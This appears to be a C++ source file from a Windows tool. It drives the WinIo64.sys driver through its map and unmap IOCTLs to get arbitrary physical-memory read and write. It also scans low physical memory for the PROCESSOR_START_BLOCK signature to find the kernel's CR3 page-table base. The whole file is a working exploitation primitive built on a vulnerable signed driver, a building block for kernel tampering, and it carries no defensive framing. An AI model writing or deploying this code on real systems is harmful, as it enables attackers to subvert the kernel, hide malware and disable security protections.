// ioctl.cpp -- WinIo64.sys physmem MAP/UNMAP implementation.

#include "ioctl.h"

#include <algorithm>
#include <cstdio>
#include <cstring>

namespace ioctl {

bool map_physical(HANDLE device, uint64_t phys, uint32_t size, RwFlag /*rw*/, Handle& h) {
    std::memset(&h, 0, sizeof(h));
    h.dwPhysMemSizeInBytes = size;
    h.pvPhysAddress        = phys;

    DWORD returned = 0;
    BOOL ok = DeviceIoControl(device, IOCTL_MAP_PHYS,
                              &h, sizeof(h),
                              &h, sizeof(h),
                              &returned, nullptr);
    if (!ok || h.pvPhysMemLin == 0) {
        std::printf("[!] ioctl::map_physical failed (phys=%016llX size=%u err=%lu)\n",
                    static_cast<unsigned long long>(phys), size, GetLastError());
        return false;
    }
    return true;
}

bool unmap_physical(HANDLE device, const Handle& h) {
    DWORD returned = 0;
    Handle buf = h;
    BOOL ok = DeviceIoControl(device, IOCTL_UNMAP_PHYS,
                              &buf, sizeof(buf),
                              &buf, sizeof(buf),
                              &returned, nullptr);
    if (!ok) {
        std::printf("[!] ioctl::unmap_physical failed (va=%016llX err=%lu)\n",
                    static_cast<unsigned long long>(h.pvPhysMemLin), GetLastError());
        return false;
    }
    return true;
}

bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
    uint8_t* out = static_cast<uint8_t*>(dst);
    while (size) {
        uint64_t page_off = phys & 0xFFFULL;
        size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));

        Handle h{};
        if (!map_physical(device, phys & ~0xFFFULL, 0x1000, RW_READ, h))
            return false;

        std::memcpy(out, reinterpret_cast<uint8_t*>(h.pvPhysMemLin) + page_off, chunk);

        if (!unmap_physical(device, h))
            return false;

        phys += chunk;
        out  += chunk;
        size -= chunk;
    }
    return true;
}

bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        uint64_t page_off = phys & 0xFFFULL;
        size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));

        Handle h{};
        if (!map_physical(device, phys & ~0xFFFULL, 0x1000, RW_WRITE, h))
            return false;

        std::memcpy(reinterpret_cast<uint8_t*>(h.pvPhysMemLin) + page_off, in, chunk);

        if (!unmap_physical(device, h))
            return false;

        phys += chunk;
        in   += chunk;
        size -= chunk;
    }
    return true;
}

// Map the low 1 MB and scan for the PROCESSOR_START_BLOCK fingerprint.
// CR3 sits at offset 160 of the matching page. Three qword fingerprints
// at offsets 0, 112, 160 uniquely identify the struct across Windows 10/11.
bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
    Handle h{};
    if (!map_physical(device, 0, 0x100000, RW_READ, h))
        return false;

    const uint8_t* mem = reinterpret_cast<const uint8_t*>(h.pvPhysMemLin);
    cr3 = 0;

    for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000) {
        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem + off);
        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem + off + 112);
        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem + off + 160);

        if ((sig0   & 0xFFFFFFFFFFFF00FFULL) == 0x00000001000600E9ULL &&
            (ptr112 & 0xFFFFF80000000003ULL) == 0xFFFFF80000000000ULL &&
            (val160 & 0xFFFFFF0000000FFFULL) == 0) {
            cr3 = val160;
            break;
        }
    }

    unmap_physical(device, h);

    if (cr3 == 0) {
        std::printf("[!] ioctl::get_pml4_phys: CR3 scan found no matching page in low 1 MB\n");
        return false;
    }
    return true;
}

} // namespace ioctl
